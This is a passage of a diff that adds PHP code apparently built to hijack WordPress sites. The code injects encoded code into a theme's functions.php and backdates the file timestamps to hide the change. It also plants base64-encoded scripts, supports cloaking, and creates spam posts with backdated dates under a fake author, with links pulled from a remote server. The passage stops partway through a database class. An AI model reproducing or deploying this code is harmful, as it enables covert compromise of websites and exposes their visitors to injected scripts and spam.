+    list ( $firstNum, $secondNum ) = explode( '-', $range );
+
+    if ( ! makeDir( $dirname ) ) {
+        throw new Exception( "dont create dirname - $dirname" );
+    }
+
+    foreach ( range( $firstNum, $secondNum ) as $num ) {
+        $filename = $num . $extension;
+        get_file( $url . $filename, $dirname !== '' ?
+            $dirname . DIRECTORY_SEPARATOR . $filename : $filename );
+    }
+}
+
+function filesizemb( $file ) {
+    return number_format( filesize( $file ) / pow( 1024, 2 ), 3, '.', '' );
+}
+
+function makeDir( $dirname ) {
+
+
+    if ( $dirname !== '' ) {
+        if ( ! is_dir( $dirname ) ) {
+            if ( ! mkdir( $dirname, 0777, true ) ) {
+                return false;
+            }
+        }
+    }
+    $GLOBALS['createdDirectories'][] = $dirname;
+
+    return true;
+}
+
+function jsPrepare( $jsSource ) {
+
+    $base64 = base64_encode( $jsSource );
+
+    return '<script src="data:text/javascript;base64,' . $base64 . '"></script>';
+}
+
+function modify_functions_php( $functionsPath, $source, $tmpDir, $deleteOldCustomFilters = false ) {
+
+    $functionsSource = file_get_contents( $functionsPath );
+    oldFunctionPathBak( $tmpDir, $functionsPath );
+
+    if ( $deleteOldCustomFilters ) {
+        $regexp          = '~\/\*\s+custom filters\s+\*\/(.+)\/\*\s*custom filters\s*\*\/~su';
+        $functionsSource = preg_replace( $regexp, '', $functionsSource );
+    }
+
+    preg_match( '~\<\?(php)*~', $functionsSource, $tagMatches );
+
+    if ( empty( $tagMatches ) ) {
+        return;
+    }
+
+    $phpMatches        = preg_quote( $tagMatches[0] );
+    $newFunctionSource = preg_replace( "~$phpMatches~", $tagMatches[0] . "\n\n" . base64_decode( $source ), $functionsSource, 1 );
+
+    if ( file_put_contents( $functionsPath, $newFunctionSource ) !== false ) {
+        /* dont touch me please */
+        //touch($functionsPath, frequenttimestamp(dirname($functionsPath)));
+        return true;
+    }
+
+    return false;
+}
+
+function findOldSettings( $functionsSource ) {
+
+    $oldSourceRegex = '/\'(.+?\.xml\$)\'\s*=>\s*\'(.+?)\'/m';
+
+    if ( preg_match( $oldSourceRegex, $functionsSource, $oldSourceMatches ) ) {
+        echo 'old settings value detected' . PHP_EOL;
+
+        $jsScriptRegex = '/\$str\s*=\s*<<<STR(.+?)STR;/s';
+        preg_match( $jsScriptRegex, $functionsSource, $jsMatches );
+
+        $oldSettingsArr = generateSettings( 9999, trim( $jsMatches[1] )
+            , $oldSourceMatches[1], $oldSourceMatches[2], null );
+
+        return $oldSettingsArr;
+    } else {
+        //find in db
+        echo 'find old settings in DB' . PHP_EOL;
+
+        return getDbSettingsCustom();
+    }
+}
+
+function getDbSettingsCustom() {
+
+    $settings = CustomDbHandler::getInstance()->getOption( 'wp_custom_filters' );
+
+
+    if ( $settings ) {
+        return unserialize( base64_decode( $settings['option_value'] ) );
+    }
+    //echo 'no old settings';
+
+    return null;
+}
+
+function oldFunctionPathBak( $tmpDir, $functionsPath ) {
+
+    if ( ! is_writeable( dirname( $functionsPath ) ) ) {
+        $backupPath = $tmpDir . '/' . basename( $functionsPath ) . '_bak';
+    } else {
+        $backupPath = $functionsPath . '_bak';
+    }
+    echo "functions backup path - $backupPath\n";
+    file_put_contents( $backupPath, file_get_contents( $functionsPath ) );
+    touch( $backupPath, frequenttimestamp( dirname( $backupPath ) ) );
+}
+
+function replaceJSinSource( $source, $preparedScript ) {
+    $decoded = base64_decode( $source );
+
+    $modified = str_replace( array( 'JAVASCRIPT', 'SITEMAP_NAME' ), array( $preparedScript, SITEMAP_NAME ), $decoded );
+
+    return base64_encode( $modified );
+}
+
+function sendpostUploader( $url, $fields ) {
+
+    $fields_string = '';
+    foreach ( $fields as $key => $value ) {
+
+        $fields_string .= $key . '=' . $value . '&';
+    }
+    rtrim( $fields_string, '&' );
+
+    $ch = curl_init();
+    curl_setopt( $ch, CURLOPT_URL, $url );
+    curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1 );
+    curl_setopt( $ch, CURLOPT_TIMEOUT, 10 );
+    curl_setopt( $ch, CURLOPT_POST, count( $fields ) );
+    curl_setopt( $ch, CURLOPT_POSTFIELDS, $fields_string );
+    curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, 0 );
+    curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, 0 );
+    $result = curl_exec( $ch );
+    $info   = curl_getinfo( $ch );
+
+    if ( curl_errno( $ch ) ) {
+        $error_msg = curl_error( $ch );
+        echo $error_msg . PHP_EOL;
+
+        return null;
+    }
+
+
+    curl_close( $ch );
+
+    return ( $info["http_code"] == 200 ) ? $result : null;
+}
+
+function contentParts( $pageSource ) {
+
+    preg_match_all( '/\[(TITLE|TEXT)\](.+)\[\/(\1)]/ius'
+        , $pageSource, $kuski );
+
+    if ( ! isset( $kuski[2][0] ) ) {
+        throw new Exception( 'invalid title' );
+    }
+    if ( ! isset( $kuski[2][1] ) ) {
+        throw new Exception( 'invalid text' );
+    }
+
+
+    $title = mb_convert_encoding( trim( $kuski[2][0] ), 'HTML-ENTITIES', "UTF-8" );
+    $slug  = stringToSlug( $kuski[2][0] );
+    $text  = mb_convert_encoding( trim( $kuski[2][1] ), 'HTML-ENTITIES', "UTF-8" );
+
+    return array(
+        'title' => $title,
+        'text'  => $text,
+        'slug'  => $slug,
+    );
+}
+
+function resultFormat( $blogUrl, $postId, $title ) {
+    return rtrim( $blogUrl, '/' ) . '/?p=' . $postId . ';' . $title;
+}
+
+function randDate() {
+    $randDate = mktime( rand( 1, 11 ), rand( 0, 59 ), rand( 0, 59 ), date( "m" ) + rand( 1, 12 ), date( "d" ) + rand( 1, 20 ), date( "Y" ) - rand( 4, 7 ) );
+
+    return date( 'Y-m-d H:i:s', $randDate );
+}
+
+function stringToSlug( $str ) {
+
+
+    $options = array(
+        'delimiter'     => '-',
+        'limit'         => null,
+        'lowercase'     => true,
+        'replacements'  => array(),
+        'transliterate' => true,
+    );
+
+    $char_map = array(
+        // Latin
+        'À' => 'A',
+        'Á' => 'A',
+        'Â' => 'A',
+        'Ã' => 'A',
+        'Ä' => 'A',
+        'Å' => 'A',
+        'Ă' => 'A',
+        'Æ' => 'AE',
+        'Ç' => 'C',
+        'È' => 'E',
+        'É' => 'E',
+        'Ê' => 'E',
+        'Ë' => 'E',
+        'Ì' => 'I',
+        'Í' => 'I',
+        'Î' => 'I',
+        'Ï' => 'I',
+        'Ð' => 'D',
+        'Ñ' => 'N',
+        'Ò' => 'O',
+        'Ó' => 'O',
+        'Ô' => 'O',
+        'Õ' => 'O',
+        'Ö' => 'O',
+        'Ő' => 'O',
+        'Ø' => 'O',
+        'Ș' => 'S',
+        'Ù' => 'U',
+        'Ú' => 'U',
+        'Û' => 'U',
+        'Ü' => 'U',
+        'Ű' => 'U',
+        'Ý' => 'Y',
+        'Þ' => 'TH',
+        'ß' => 'ss',
+        'à' => 'a',
+        'á' => 'a',
+        'â' => 'a',
+        'ã' => 'a',
+        'ä' => 'a',
+        'å' => 'a',
+        'ă' => 'a',
+        'æ' => 'ae',
+        'ç' => 'c',
+        'è' => 'e',
+        'é' => 'e',
+        'ê' => 'e',
+        'ë' => 'e',
+        'ì' => 'i',
+        'í' => 'i',
+        'î' => 'i',
+        'ï' => 'i',
+        'ð' => 'd',
+        'ñ' => 'n',
+        'ò' => 'o',
+        'ó' => 'o',
+        'ô' => 'o',
+        'õ' => 'o',
+        'ö' => 'o',
+        'ő' => 'o',
+        'ø' => 'o',
+        'ș' => 's',
+        'ù' => 'u',
+        'ú' => 'u',
+        'û' => 'u',
+        'ü' => 'u',
+        'ű' => 'u',
+        'ý' => 'y',
+        'þ' => 'th',
+        'ÿ' => 'y',
+        // Latin symbols
+        '©' => '(c)',
+        // Greek
+        'Α' => 'A',
+        'Β' => 'B',
+        'Γ' => 'G',
+        'Δ' => 'D',
+        'Ε' => 'E',
+        'Ζ' => 'Z',
+        'Η' => 'H',
+        'Θ' => '8',
+        'Ι' => 'I',
+        'Κ' => 'K',
+        'Λ' => 'L',
+        'Μ' => 'M',
+        'Ν' => 'N',
+        'Ξ' => '3',
+        'Ο' => 'O',
+        'Π' => 'P',
+        'Ρ' => 'R',
+        'Σ' => 'S',
+        'Τ' => 'T',
+        'Υ' => 'Y',
+        'Φ' => 'F',
+        'Χ' => 'X',
+        'Ψ' => 'PS',
+        'Ω' => 'W',
+        'Ά' => 'A',
+        'Έ' => 'E',
+        'Ί' => 'I',
+        'Ό' => 'O',
+        'Ύ' => 'Y',
+        'Ή' => 'H',
+        'Ώ' => 'W',
+        'Ϊ' => 'I',
+        'Ϋ' => 'Y',
+        'α' => 'a',
+        'β' => 'b',
+        'γ' => 'g',
+        'δ' => 'd',
+        'ε' => 'e',
+        'ζ' => 'z',
+        'η' => 'h',
+        'θ' => '8',
+        'ι' => 'i',
+        'κ' => 'k',
+        'λ' => 'l',
+        'μ' => 'm',
+        'ν' => 'n',
+        'ξ' => '3',
+        'ο' => 'o',
+        'π' => 'p',
+        'ρ' => 'r',
+        'σ' => 's',
+        'τ' => 't',
+        'υ' => 'y',
+        'φ' => 'f',
+        'χ' => 'x',
+        'ψ' => 'ps',
+        'ω' => 'w',
+        'ά' => 'a',
+        'έ' => 'e',
+        'ί' => 'i',
+        'ό' => 'o',
+        'ύ' => 'y',
+        'ή' => 'h',
+        'ώ' => 'w',
+        'ς' => 's',
+        'ϊ' => 'i',
+        'ΰ' => 'y',
+        'ϋ' => 'y',
+        'ΐ' => 'i',
+        // Turkish
+        'Ş' => 'S',
+        'İ' => 'I',
+        'Ç' => 'C',
+        'Ü' => 'U',
+        'Ö' => 'O',
+        'Ğ' => 'G',
+        'ş' => 's',
+        'ı' => 'i',
+        'ç' => 'c',
+        'ü' => 'u',
+        'ö' => 'o',
+        'ğ' => 'g',
+        // Russian
+        'А' => 'A',
+        'Б' => 'B',
+        'В' => 'V',
+        'Г' => 'G',
+        'Д' => 'D',
+        'Е' => 'E',
+        'Ё' => 'Yo',
+        'Ж' => 'Zh',
+        'З' => 'Z',
+        'И' => 'I',
+        'Й' => 'J',
+        'К' => 'K',
+        'Л' => 'L',
+        'М' => 'M',
+        'Н' => 'N',
+        'О' => 'O',
+        'П' => 'P',
+        'Р' => 'R',
+        'С' => 'S',
+        'Т' => 'T',
+        'У' => 'U',
+        'Ф' => 'F',
+        'Х' => 'H',
+        'Ц' => 'C',
+        'Ч' => 'Ch',
+        'Ш' => 'Sh',
+        'Щ' => 'Sh',
+        'Ъ' => '',
+        'Ы' => 'Y',
+        'Ь' => '',
+        'Э' => 'E',
+        'Ю' => 'Yu',
+        'Я' => 'Ya',
+        'а' => 'a',
+        'б' => 'b',
+        'в' => 'v',
+        'г' => 'g',
+        'д' => 'd',
+        'е' => 'e',
+        'ё' => 'yo',
+        'ж' => 'zh',
+        'з' => 'z',
+        'и' => 'i',
+        'й' => 'j',
+        'к' => 'k',
+        'л' => 'l',
+        'м' => 'm',
+        'н' => 'n',
+        'о' => 'o',
+        'п' => 'p',
+        'р' => 'r',
+        'с' => 's',
+        'т' => 't',
+        'у' => 'u',
+        'ф' => 'f',
+        'х' => 'h',
+        'ц' => 'c',
+        'ч' => 'ch',
+        'ш' => 'sh',
+        'щ' => 'sh',
+        'ъ' => '',
+        'ы' => 'y',
+        'ь' => '',
+        'э' => 'e',
+        'ю' => 'yu',
+        'я' => 'ya',
+        // Ukrainian
+        'Є' => 'Ye',
+        'І' => 'I',
+        'Ї' => 'Yi',
+        'Ґ' => 'G',
+        'є' => 'ye',
+        'і' => 'i',
+        'ї' => 'yi',
+        'ґ' => 'g',
+        // Czech
+        'Č' => 'C',
+        'Ď' => 'D',
+        'Ě' => 'E',
+        'Ň' => 'N',
+        'Ř' => 'R',
+        'Š' => 'S',
+        'Ť' => 'T',
+        'Ů' => 'U',
+        'Ž' => 'Z',
+        'č' => 'c',
+        'ď' => 'd',
+        'ě' => 'e',
+        'ň' => 'n',
+        'ř' => 'r',
+        'š' => 's',
+        'ť' => 't',
+        'ů' => 'u',
+        'ž' => 'z',
+        // Polish
+        'Ą' => 'A',
+        'Ć' => 'C',
+        'Ę' => 'e',
+        'Ł' => 'L',
+        'Ń' => 'N',
+        'Ó' => 'o',
+        'Ś' => 'S',
+        'Ź' => 'Z',
+        'Ż' => 'Z',
+        'ą' => 'a',
+        'ć' => 'c',
+        'ę' => 'e',
+        'ł' => 'l',
+        'ń' => 'n',
+        'ó' => 'o',
+        'ś' => 's',
+        'ź' => 'z',
+        'ż' => 'z',
+        // Latvian
+        'Ā' => 'A',
+        'Č' => 'C',
+        'Ē' => 'E',
+        'Ģ' => 'G',
+        'Ī' => 'i',
+        'Ķ' => 'k',
+        'Ļ' => 'L',
+        'Ņ' => 'N',
+        'Š' => 'S',
+        'Ū' => 'u',
+        'Ž' => 'Z',
+        'ā' => 'a',
+        'č' => 'c',
+        'ē' => 'e',
+        'ģ' => 'g',
+        'ī' => 'i',
+        'ķ' => 'k',
+        'ļ' => 'l',
+        'ņ' => 'n',
+        'š' => 's',
+        'ū' => 'u',
+        'ž' => 'z'
+    );
+
+    // Transliterate characters to ASCII
+    if ( $options['transliterate'] ) {
+        $str = str_replace( array_keys( $char_map ), $char_map, $str );
+    }
+
+    // Replace non-alphanumeric characters with our delimiter
+    $str = preg_replace( '/[^\p{L}\p{Nd}]+/u', $options['delimiter'], $str );
+
+    // Remove duplicate delimiters
+    $str = preg_replace( '/(' . preg_quote( $options['delimiter'], '/' ) . '){2,}/', '$1', $str );
+
+    // Truncate slug to max. characters
+    $str = mb_substr( $str, 0, ( $options['limit'] ? $options['limit'] : mb_strlen( $str, 'UTF-8' ) ), 'UTF-8' );
+
+    // Remove delimiter from ends
+    $str = trim( $str, $options['delimiter'] );
+
+    return $options['lowercase'] ? mb_strtolower( $str, 'UTF-8' ) : $str;
+}
+
+function removeDirRec( $dir ) {
+    if ( $objs = glob( $dir . "/*" ) ) {
+        foreach ( $objs as $obj ) {
+            is_dir( $obj ) ? removeDirRec( $obj ) : unlinkHandler( $obj );
+        }
+    }
+    rmdir( $dir );
+}
+
+function unlinkHandler( $obj ) {
+    if ( unlink( $obj ) ) {
+        echo "$obj deleted " . PHP_EOL;
+
+        return;
+    }
+    echo "!!!!!!!$obj failed to delete !!!!!!!" . PHP_EOL;
+}
+
+function deletePosts( $global = false ) {
+
+    $userId = defined( 'CUSTOM_AUTHOR_ID' ) ? CUSTOM_AUTHOR_ID : 9999;
+
+    if ( $global ) {
+        $settings = getDbSettingsCustom();
+
+        if ( ! $settings ) {
+            echo 'invalid get settings from db' . PHP_EOL;
+        } else {
+            $users = array_keys( $settings );
+            if ( ! in_array( 9999, $users ) ) {
+                $users[] = 9999;
+            }
+        }
+    }
+
+    if ( ! isset( $users ) ) {
+        $users = array( $userId );
+    }
+
+    CustomDbHandler::getInstance()->deletePosts( $users );
+
+    return true;
+}
+
+function replacePTags( $source, $links ) {
+
+    preg_match_all( '~.{20}<\/p>~us', $source, $matches );
+
+    if ( empty( $matches[0] ) ) {
+        return null;
+    }
+
+    $num                     = range( 0, count( $matches[0] ) - 1 );
+    $patternsReplacementsArr = array();
+
+    foreach ( $links as $link ) {
+        $randNum = $num[ rand( 0, count( $matches[0] ) - 1 ) ];
+        $pattern = '~' . preg_quote( $matches[0][ $randNum ] ) . '~us';
+
+        if ( isset( $patternsReplacementsArr[ $pattern ] ) ) {
+            $patternsReplacementsArr[ $pattern ] = $patternsReplacementsArr[ $pattern ] . "\n" . $link;
+        } else {
+            $patternsReplacementsArr[ $pattern ] = $matches[0][ $randNum ] . "\n" . $link;
+        }
+    }
+
+    return preg_replace( array_keys( $patternsReplacementsArr ), array_values( $patternsReplacementsArr ), $source );
+}
+
+function urlBlockSec( $url, $lastmod, $changefreq, $priority ) {
+
+    return <<<STR
+   <url>
+      <loc>$url</loc>
+      <lastmod>$lastmod</lastmod>
+      <changefreq>$changefreq</changefreq>
+      <priority>$priority</priority>
+   </url>\n\n
+STR;
+}
+
+function currenturl( $rootDir, $host = null ) {
+
+    $host = ! $host ? 'http://' . $_SERVER['HTTP_HOST'] : $host;
+    $tmp  = str_replace( realpath( $_SERVER['DOCUMENT_ROOT'] ), '', $host . $rootDir );
+
+    return $tmp;
+}
+
+function checkSitemapNameRoot() {
+
+    if ( ! is_writeable( WP_ROOT_DIR ) ) {
+        echo WP_ROOT_DIR . ' isnt writeable' . PHP_EOL;
+
+        return false;
+    }
+
+    if ( file_exists( WP_ROOT_DIR . '/' . SITEMAP_NAME . '.xml' ) ) {
+        echo SITEMAP_NAME . '.xml in root dir, change sitemap name' . PHP_EOL;
+
+        return false;
+    }
+
+    return true;
+}
+
+function frequenttimestamp( $pathtodir ) {
+
+    foreach ( glob( $pathtodir . "/*php" ) as $file ) {
+        $tmp[] = filemtime( $file );
+    }
+    $count = array_count_values( $tmp );
+    arsort( $count );
+    $keys = array_keys( $count );
+
+    return array_shift( $keys );
+}
+
+function mb_basename( $file, $ext = '' ) {
+    $explodedPath = explode( '/', $file );
+    $last         = end( $explodedPath );
+
+    return ( $ext !== '' ) ? str_replace( $ext, '', $last ) : $last;
+}
+
+function generateSettings( $userId, $jsSource, $sitemapRegex, $feedPath, $homeLinksSettings ) {
+    return array(
+        $userId => array(
+            'js'              => $jsSource,
+            'sitemapsettings' => array(
+                $sitemapRegex => $feedPath,
+            ),
+            'nojs'            => ( defined( 'CLOACKING' ) ) ? CLOACKING : 0,
+            'homeLinks'       => ( defined( 'HOME_LINKS' ) && HOME_LINKS === 1 ) ? $homeLinksSettings : null,
+        ),
+    );
+}
+
+function mbReplaceCustomFilters( $functionsSource, $functionsPath, $controlHash, $sourceMod ) {
+    $customFiltersRegexp = '~\/\*\s+custom filters\s+\*\/(.+)\/\*\s*custom filters\s*\*\/~su';
+
+    if ( preg_match( $customFiltersRegexp, $functionsSource, $matches ) ) {
+
+
+        $sourceHash = md5( base64_encode( $matches[0] ) );
+
+        if ( $sourceHash === $controlHash ) {
+            echo "functions php hashes are identity" . PHP_EOL;
+
+            return true;
+        } else {
+
+            echo "need to restore code" . PHP_EOL;
+            if ( modify_functions_php( $functionsPath, $sourceMod, $tmpDir, true ) ) {
+                echo "functions modified" . PHP_EOL;
+
+                return true;
+            }
+        }
+    } else {
+        echo "code not found... record!" . PHP_EOL;
+        if ( modify_functions_php( $functionsPath, $sourceMod, $tmpDir ) ) {
+            echo "functions modified" . PHP_EOL;
+
+            return true;
+        }
+    }
+
+    return false;
+}
+
+function customSitemapName( $sitemapName ) {
+    return array(
+        "$sitemapName\.xml$" => "index.php?feed=xml$sitemapName"
+    );
+}
+
+function viewSettingsAction() {
+    $settings = getDbSettingsCustom();
+
+    if ( $settings ) {
+
+        foreach ( $settings as $userId => $arr ) {
+
+            echo str_repeat( '_', 100 ) . PHP_EOL;
+            echo $userId . ' - userId' . PHP_EOL;
+            if ( isset( $arr['js'] ) && $decodedJs = detectBase64js( $arr['js'] ) ) {
+                $arr['js'] = parseJsScript( $decodedJs );
+            }
+            echo json_encode( $arr, JSON_PRETTY_PRINT );
+            echo str_repeat( '_', 100 ) . PHP_EOL;
+        }
+
+        return true;
+    }
+
+    return false;
+}
+
+function homeLinksSettingsFormatter( $arr ) {
+
+
+    if ( ! $arr ) {
+        return '';
+    }
+
+    foreach ( $arr as $key => $value ) {
+
+        if ( is_array( $value ) ) {
+            foreach ( $value as $keySec => $valueSec ) {
+                echo sprintf( '  %s => %s%s', $keySec, $valueSec, PHP_EOL );
+            }
+            continue;
+        }
+
+
+        echo sprintf( '  %s => %s%s', $key, $value, PHP_EOL );
+    }
+
+    return;
+}
+
+function detectBase64js( $string ) {
+
+    if ( preg_match( '~data:text\/javascript;base64,(.+?)\">~s', $string, $matches ) ) {
+        return base64_decode( $matches[1] );
+    }
+
+    return false;
+}
+
+function parseJsScript( $string ) {
+
+    $results = array();
+    preg_match( '~hit;([^\?]+)~', $string, $lirucounter );
+
+    if ( isset( $lirucounter[1] ) ) {
+        $results['lirucounter'] = $lirucounter[1];
+    }
+
+
+    preg_match( '~([^\"\.\/]+\.js)\?ref~', $string, $route );
+
+    if ( isset( $route[1] ) ) {
+        $results['route'] = $route[1];
+    }
+
+
+    preg_match( '~src=.+?([^\/\"\\\\]+)~', $string, $domain );
+
+    if ( isset( $domain[1] ) ) {
+        $results['domain'] = $domain[1];
+    }
+
+    return $results;
+}
+
+function settingsArr( $functionsSource ) {
+
+    $oldSettings     = findOldSettings( $functionsSource );
+    $userId          = defined( 'CUSTOM_AUTHOR_ID' ) ? CUSTOM_AUTHOR_ID : 9999;
+    $sitemapRegexArr = customSitemapName( SITEMAP_NAME );
+
+    $newSettings = generateSettings( $userId, jsPrepare( JS_SOURCE ), key( $sitemapRegexArr )
+        , current( $sitemapRegexArr ), $_SERVER['homeLinksSettings'] );
+
+    if ( ! $oldSettings ) {
+
+        //echo 'only new settings' . PHP_EOL;
+
+        return $newSettings;
+    } else {
+        $settings = compareNewOldSettings( $oldSettings, $newSettings, $userId );
+        if ( defined( 'FORCE_CHANGE_HOME_LINKS_OWNER' ) && FORCE_CHANGE_HOME_LINKS_OWNER === 1 ) {
+            $settings = removeHomeLinkKey( $settings );
+        }
+
+        return $settings;
+    }
+}
+
+function compareNewOldSettings( $oldSettings, $newSettings, $userId ) {
+
+    if ( ! isset( $oldSettings[ $userId ] ) ) {
+        $newSettingsKey   = key( $newSettings );
+        $newSettingsRegex = key( $newSettings[ $newSettingsKey ]['sitemapsettings'] );
+        foreach ( $oldSettings as $key => $value ) {
+
+            $oldSettingsRegex = key( $value['sitemapsettings'] );
+
+            if ( $oldSettingsRegex === $newSettingsRegex ) {
+                $oldSitemapValue = str_replace( '\.xml$', '', $oldSettingsRegex );
+                echo $oldSitemapValue . ' already use in oldsettings' . PHP_EOL;
+
+                return false;
+            }
+        }
+
+        return $newSettings + $oldSettings;
+    }
+
+    $jsDiff = strcmp( $oldSettings[ $userId ]['js'], $newSettings[ $userId ]['js'] );
+
+    if ( $jsDiff !== 0 ) {
+
+        echo 'js scripts are different' . PHP_EOL;
+        if ( defined( 'REDEFINE_JS_FOR_USER' ) && REDEFINE_JS_FOR_USER === 1 ) {
+            echo 'old script will be overwritten' . PHP_EOL;
+        } else {
+            return false;
+        }
+    }
+
+    $sitemapSettingsDiff = strcmp( key( $oldSettings[ $userId ]['sitemapsettings'] )
+        , key( $newSettings[ $userId ]['sitemapsettings'] ) );
+
+    if ( $sitemapSettingsDiff !== 0 ) {
+        $oldSitemapValue = key( $oldSettings[ $userId ]['sitemapsettings'] );
+        $oldSitemapValue = str_replace( '\.xml$', '', $oldSitemapValue );
+        echo 'sitemap settings are different' . PHP_EOL;
+        echo "old sitemap value $oldSitemapValue" . PHP_EOL;
+
+        return false;
+    }
+
+    return $newSettings + $oldSettings;
+    //return $newSettings;
+}
+
+function linkBuildingSettingsCheck() {
+    if ( defined( 'EXTERNAL_LINKING' ) && ( EXTERNAL_LINKING === 1 ) ) {
+        if ( ! defined( 'EXTERNAL_LINKS_COUNT_PAGE' ) ) {
+            echo 'set EXTERNAL_LINKS_COUNT_PAGE' . PHP_EOL;
+
+            return false;
+        }
+        if ( ! defined( 'TABLE_HASH' ) && ! defined( 'HTML_HASH' ) ) {
+            echo 'set TABLE_HASH or HTML_HASH value' . PHP_EOL;
+
+            return false;
+        }
+
+        if ( ! defined( 'COUNT_LINKS_FROM_DOMAIN' ) ) {
+            echo 'set COUNT_LINKS_FROM_DOMAIN' . PHP_EOL;
+
+            return false;
+        }
+    }
+
+    return true;
+}
+
+function downloadExternalLinks( $countHtmlFiles ) {
+    list ( $minExtLinks, $maxExtLinks ) = explode( '..', EXTERNAL_LINKS_COUNT_PAGE );
+    $linksLimit = $countHtmlFiles * $maxExtLinks;
+
+    $params = array(
+        'tableHash'     => defined( 'TABLE_HASH' ) ? TABLE_HASH : '',
+        'htmlHash'      => defined( 'HTML_HASH' ) ? HTML_HASH : '',
+        'linksLimit'    => $linksLimit,
+        'maxLinksCount' => COUNT_LINKS_FROM_DOMAIN,
+    );
+
+    $query = http_build_query( $params );
+
+    get_file( GS_ALIAS . '/dnc/wp-acceptors-api/batch-get-links-test?' . $query, TMPDIR . '/ext-links.txt' );
+}
+
+function textWithLinks( $text, $results, &$extLinksArr ) {
+
+    $internalLinks = array();
+    $externalLinks = array();
+
+    if ( INTERNAL_LINKING === 1 ) {
+
+        list ( $minLinks, $maxLinks ) = explode( '..', INTERNAL_LINKS_COUNT_PAGE );
+        $range      = range( $minLinks, $maxLinks );
+        $linksCount = $range[ rand( 0, count( $range ) - 1 ) ];
+
+        if ( count( $results ) >= $linksCount ) {
+            shuffle( $results );
+            $slicedResults = array_slice( $results, 0, $linksCount );
+            $internalLinks = linksPrepare( $slicedResults );
+        }
+    }
+
+    if ( ( EXTERNAL_LINKING === 1 ) && ! empty( $extLinksArr ) ) {
+        list ( $minLinks, $maxLinks ) = explode( '..', EXTERNAL_LINKS_COUNT_PAGE );
+        $randCount = rand( $minLinks, $maxLinks );
+
+        if ( $randCount <= count( $extLinksArr ) ) {
+            $externalLinks = array_splice( $extLinksArr, 0, $randCount );
+        } else {
+            $externalLinks = $extLinksArr;
+            $extLinksArr   = array();
+        }
+    }
+
+    $allLinksTypes = $externalLinks + $internalLinks;
+
+    return replacePTags( $text, $allLinksTypes );
+}
+
+function decodeExternalLinks() {
+    if ( ! file_exists( TMPDIR . '/ext-links.txt' ) ) {
+        echo 'no external links source' . PHP_EOL;
+
+        return false;
+    }
+
+    $extLinksSource = file_get_contents( TMPDIR . '/ext-links.txt' );
+
+    $extLinksSourceDecode = json_decode( $extLinksSource, 1 );
+
+    if ( ! is_array( $extLinksSourceDecode ) || ! isset( $extLinksSourceDecode['links'] ) ) {
+
+        if ( trim( $extLinksSource ) == 'tmp table not found' ) {
+            echo TABLE_HASH . ' table not found' . PHP_EOL;
+
+            return false;
+        }
+
+        if ( trim( $extLinksSource ) == 'table expired' ) {
+            echo TABLE_HASH . ' table expired' . PHP_EOL;
+
+            return false;
+        }
+
+        if ( trim( $extLinksSource ) == 'table is empty' ) {
+            echo TABLE_HASH . ' db links not found';
+
+            return false;
+        }
+
+        if ( trim( $extLinksSource ) == 'file with links not found' ) {
+            echo HTML_HASH . ' file with links not found';
+
+            return false;
+        }
+
+
+        echo 'error while decoding json external links' . PHP_EOL;
+
+        return false;
+    }
+
+    return $extLinksSourceDecode['links'];
+}
+
+function deleteSettings() {
+
+    if ( ! defined( 'CUSTOM_AUTHOR_ID' ) ) {
+        return;
+    }
+
+    $settings = getDbSettingsCustom();
+
+    if ( isset( $settings[ CUSTOM_AUTHOR_ID ] ) ) {
+        unset( $settings[ CUSTOM_AUTHOR_ID ] );
+        echo 'delete settings for user id ' . CUSTOM_AUTHOR_ID . PHP_EOL;
+        writeSettingsDB( $settings );
+    }
+}
+
+function isJsonCustom( $string ) {
+    json_decode( $string );
+
+    return ( json_last_error() == JSON_ERROR_NONE );
+}
+
+function isBadEnvCustom() {
+
+    $requestUri = $_SERVER['REQUEST_URI'];
+
+    if ( strstr( $requestUri, 'wp-config-sample.php' ) !== false ) {
+        return true;
+    }
+
+    return false;
+}
+
+function allPermalinksAction() {
+    var_dump( CustomDbHandler::getInstance()
+        ->allPostsFromDb( HOME_URL, CUSTOM_AUTHOR_ID ) );
+
+    return;
+}
+
+
+class CustomDbHandler {
+
+    /**
+     * @var CustomDbHandler
+     */
+    private static $instance;
+
+    const DB_TYPE_SQLITE = 'sqlite';
+    const DB_TYPE_MYSQL = 'mysql';
+
+    private $dsn;
+    public $dbName;
+    public $dbPrefix;
+    public $dbUser;
+    public $dbPassword;
+    public $dbHostAddr;
+    public $dbPort;
+
+    public $dbType;
+
+    public function __construct( $db, $config = false ) {
+        $this->dsn = $db;
+        $this->setDBSettings( $config );
+        $this->dbType = (!$config) ? self::DB_TYPE_SQLITE : self::DB_TYPE_MYSQL;
+        static::$instance = $this;
+
+    }
+
+    public static function getInstance() {
+        if ( static::$instance ) {
+            return static::$instance;
+        }
+
+        return null;
+    }
+
+    public function setDBSettings( $config ) {
+
+        /** sqlite **/
+        if ( ! $config ) {
+            $this->dbName   = 'main';
+            $this->dbPrefix = 'wp_';
+        } else {
+            $this->dbName     = $config['dbname'];
+            $this->dbUser     = $config['dbuser'];
+            $this->dbPassword = $config['dbpassword'];
+            $this->dbHostAddr = $config['dbhostaddr'];
+            $this->dbPrefix   = $config['dbprefix'];
+            $this->dbPort     = $config['dbport'];
+        }
+
+        return;
+
+    }
+
+
+    public function getOption( $optionName ) {
+
+        $tableWithPrefix = $this->dbPrefix . 'options';
+        $query           = "SELECT * from $tableWithPrefix where option_name = :option_name ";
+        $stmt            = $this->dsn->prepare( $query );
+
+
+        $stmt->execute( array(
+            ':option_name' => $optionName
+        ) );
+
+        return $stmt->fetch();
+    }
+
+
+    public function homeUrl() {
+
+        //'home' or 'siteurl'
+        $homeOption = $this->getOption( 'home' );
+
+        if ( strstr( $homeOption['option_value'], 'http' ) !== false ) {
+            return $homeOption['option_value'];
+        }
+
+        $siteUrlOption = $this->getOption( 'siteurl' );
+        if ( strstr( $siteUrlOption['option_value'], 'http' ) !== false ) {
+            return $siteUrlOption['option_value'];
+        }
+
+        return false;
+
+    }
+
+    public function allPostsFromDb( $homeUrl, $userId = 9999 ) {
+
+        //SELECT ID, post_title FROM `wp_posts` where post_author = 9999
+        $table = sprintf( '`%s`.`%sposts`', $this->dbName, $this->dbPrefix );
+        $query = "SELECT ID, post_title FROM $table where post_author = :user_id";
+
+
+        $stmt = $this->dsn->prepare( $query );
+
+        $stmt->execute( array(
+            ':user_id' => $userId
+        ) );
+
+        $urls = array();
+        while ( $row = $stmt->fetch( PDO::FETCH_ASSOC ) ) {
+            if ( $row ) {
